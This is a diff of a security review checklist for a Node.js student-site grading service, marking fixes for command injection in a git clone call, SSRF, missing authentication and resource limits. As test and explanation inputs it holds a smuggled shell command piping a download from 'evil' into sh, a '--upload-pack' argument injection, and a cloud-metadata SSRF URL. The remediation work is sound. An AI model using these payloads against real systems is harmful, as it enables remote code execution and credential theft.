@@ -154,17 +154,17 @@ The architecture is fundamentally sound. The problems are in **packaging, resour
   3. Or switch to `playwright-core` + a pinned system Chromium and pass `executablePath`.
   **Verify:** `rm -rf node_modules && npm ci --omit=dev && node -e "import('playwright').then(()=>console.log('ok'))"`.
 
-- [ ] **V-02 — Command injection in `cloneGitRepo`.**
+- [x] **V-02 — Command injection in `cloneGitRepo`.** **FIXED (Batch 5):** replaced `exec(\`git clone …\`)` with `simpleGit().clone(url, path, ['--depth','1','--'])` (args array, no shell); URL validated via `assertSafeUrl` first. Verified by `scripts/test-url-guard.mjs`.
   `evaluators/visual/repoService.js`: `execPromise(\`git clone ${gitUrl} ${repoPath}\`)`. `gitUrl` is attacker-controlled (`submission.repoUrl`). Input like `x.git; curl evil|sh #` or `--upload-pack=...` executes arbitrary shell.
   **Fix:** use `simple-git` (already a dependency) or `execFile('git', ['clone', '--depth', '1', '--', gitUrl, repoPath])` (note `--` and the args array — no shell). Validate scheme/host first (see `V-03`). Add `--depth 1`.
   **Verify:** attempt clone with `repoUrl="https://x.git; touch /tmp/pwned"` → no file created.
 
-- [ ] **V-03 — SSRF via `expectedUrl` and `repoUrl`; `file://` allowed.**
+- [x] **V-03 — SSRF via `expectedUrl` and `repoUrl`; `file://` allowed.** **FIXED (Batch 5):** new `utils/urlGuard.js` (`assertSafeUrl` resolves DNS + rejects loopback/private/link-local/metadata; `assertUrlSyntax` for fast allowlist checks). Applied in the controller, before clone, and before the `expectedUrl` goto. `repoUrl` restricted to `ALLOWED_GIT_HOSTS`. Verified by `scripts/test-url-guard.mjs`.
   The headless browser navigates to `expectedUrl` and clones `repoUrl` with no validation. An attacker can target `http://169.254.169.254/…` (cloud metadata), `http://localhost:<admin>`, or `file:///etc/passwd`.
   **Fix:** validate both URLs — allow only `http(s)`, resolve DNS and reject private/loopback/link-local ranges (RFC1918, 127/8, 169.254/16, ::1, fc00::/7), enforce an allowlist of git hosts for `repoUrl`. Apply the check in the controller *and* before each `goto`/clone.
   **Verify:** `expectedUrl="http://169.254.169.254/latest/meta-data/"` is rejected with 400.
 
-- [ ] **V-04 — No authentication / rate limiting on `/evaluate`.**
+- [x] **V-04 — No authentication / rate limiting on `/evaluate`.** **FIXED (Batch 5):** `middleware/auth.js` — `requireApiKey` (constant-time `x-api-key` vs `API_KEY`, fail-closed if unset) + `evaluateRateLimiter` (express-rate-limit, 60/min default), both wired onto `POST /evaluate`.
   Anyone who can reach the port can enqueue jobs → unbounded OpenAI spend, SSRF (`V-03`), RCE (`V-02`), and DoS.
   **Fix:** require an API key / mTLS / network policy; add `express-rate-limit`; bind only to the internal network.
   **Verify:** unauthenticated `POST /evaluate` → 401.
@@ -264,13 +264,13 @@ The architecture is fundamentally sound. The problems are in **packaging, resour
 - [x] **V-25 — `screenshots/` and `temp/` are never cleaned; orphaned on crash.** **FIXED (Batch 2):** per-job temp dir deleted in `finally`; `sweepStaleRepos()` removes `<cwd>/temp` clones >2h old at worker startup.
   Per-student PNGs accumulate forever; if the process dies mid-job, `temp/visual_*` clones are orphaned (only the worker `finally` deletes them). Disk fills over a semester of batches. **Fix:** use per-job temp dirs deleted in `finally`; add a startup sweep of stale `temp/`/`screenshots/` older than N hours; alert on disk usage.
 
-- [ ] **V-26 — No cap on `fullPage` screenshot dimensions.**
+- [x] **V-26 — No cap on `fullPage` screenshot dimensions.** **FIXED (Batch 5):** both screenshots use `fullPage: false`, capping capture to the viewport (explicit fixed viewport added in Batch 6 / V-23).
   A student page 50,000px tall produces a giant screenshot → memory spike, slow base64, and OpenAI may reject the image. **Fix:** cap height (clip region) or set `fullPage: false` with a fixed viewport; reject pathological pages.
 
 - [x] **V-27 — Graceful shutdown doesn't drain workers or close the browser pool.** **FIXED (Batch 2):** `server.js` handles SIGTERM **and** SIGINT, calls every `stop*Worker()` (each drains its worker + closes its pool) then `queueManager.disconnect()`, with a 30s hard-exit guard; idempotent.
   `SIGTERM` handler only calls `queueManager.disconnect()` — it does not `await visualWorker.close()` or `browserPool.close()`, and `SIGINT` isn't handled. Result: in-flight jobs are killed and **zombie Chromium processes leak** in the container across deploys. **Fix:** on SIGTERM/SIGINT, stop accepting (`worker.close()` waits for active jobs), then close the pool, then disconnect Redis, then exit; add a hard-exit timeout.
 
-- [ ] **V-28 — No payload / batch-size limits.**
+- [x] **V-28 — No payload / batch-size limits.** **FIXED (Batch 5):** controller caps `submissions.length` (`MAX_SUBMISSIONS`, default 500) and `rubricText` length (`MAX_RUBRIC_CHARS`, default 20k); `express.json({ limit })` (default 2mb) caps body size. Bad input → 400.
   `submissions` can be arbitrarily large → instant queue flood; `rubricText` unbounded. **Fix:** cap `submissions.length`, validate payload size, reject oversized rubrics; consider chunked enqueue.
 
 - [ ] **V-29 — Reference screenshot is recomputed for every submission.**
@@ -282,10 +282,10 @@ The architecture is fundamentally sound. The problems are in **packaging, resour
 
 - [x] **V-31 — `node_modules` is committed (1861 files, and incomplete — Playwright missing).** **FIXED (Batch 1):** `git rm -r --cached node_modules`; still ignored.
 - [x] **V-32 — `logs/` is committed (`combined.log`, `error.log`, `workers.log`).** **FIXED (Batch 1):** `git rm -r --cached logs`; added `logs/`, `*.log`, `temp/`, `screenshots/`, `final_scores.json` to `.gitignore`.
-- [ ] **V-33 — Debug `console.log` noise:** `getJobStatus` logs the whole job; `evaluatorService` dumps the full rubric and student URL; etc. **Fix:** route through the logger at `debug` level; never dump full job/secret payloads.
+- [x] **V-33 — Debug `console.log` noise.** **FIXED (Batch 5):** removed the full-job dump in `getJobStatus` and the rubric/url `console.log`s; routed through `logger.debug` without dumping job/secret payloads.
 - [ ] **V-34 — `vm2@3.9.19` is deprecated with known sandbox-escape CVEs** (used by the JS evaluator, not visual, but ships in the same service). **Fix:** migrate JS execution to `isolated-vm` or an E2B sandbox.
 - [x] **V-35 — Dependency bloat:** `cors`, `body-parser`, `multer`, `node-cron`, `lodash` appear unused by the running paths. **FIXED (Batch 1):** grep-confirmed 0 source uses; removed all five from `package.json`.
-- [ ] **V-36 — Static server binds all interfaces.** `server.listen(0)` (no host) binds `0.0.0.0`/`::`, exposing the student site on the network during eval. **Fix:** `server.listen(0, '127.0.0.1')`.
+- [x] **V-36 — Static server binds all interfaces.** **FIXED (Batch 5):** `server.listen(0, '127.0.0.1')` — loopback only.
 - [x] **V-37 — No `.env.example`.** **FIXED (Batch 1):** added `.env.example` documenting server/auth/Redis/OpenAI/Groq/E2B/SSRF-allowlist/logging vars.
 - [x] **V-38 — `expected.replace("url contains ", "")` mismatches the rubric prompt.** **FIXED (Batch 3):** `behaviourService.js` only strips the prefix when `expected` is a non-empty string and falls back to "any navigation = pass" when `expected` is absent.
 
